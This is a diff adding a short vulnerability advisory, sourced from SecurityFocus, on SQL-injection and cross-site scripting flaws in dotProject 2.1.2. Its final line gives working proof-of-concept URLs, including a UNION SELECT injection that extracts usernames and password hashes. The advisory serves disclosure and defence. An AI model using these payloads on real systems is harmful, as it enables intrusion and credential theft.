@@ -1,0 +1,11 @@
+source: http://www.securityfocus.com/bid/30924/info
+
+dotProject is prone to multiple SQL-injection and cross-site scripting vulnerabilities because it fails to properly sanitize user-supplied input.
+
+An attacker may leverage the cross-site scripting issues to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may allow the attacker to steal cookie-based authentication credentials and to launch other attacks.
+
+Attackers may exploit the SQL-injection issue to compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database.
+
+dotProject 2.1.2 is vulnerable; other versions may also be affected. 
+
+http://www.example.com/index.php?m=tasks&inactive=toggle"> http://www.example.com/index.php?m=calendar&a=day_view&date=20080828"> http://www.example.com/index.php?m=public&a=calendar&dialog=1&callback=setCalendar"> http://www.example.com/index.php?m=ticketsmith&type=My'> http://www.example.com/index.php?m=projects&tab=-1 UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,concat_ws(0x3a,user_id,user_username,user_password),14,15,16,17,18,19,20,21,22 FROM users-- 
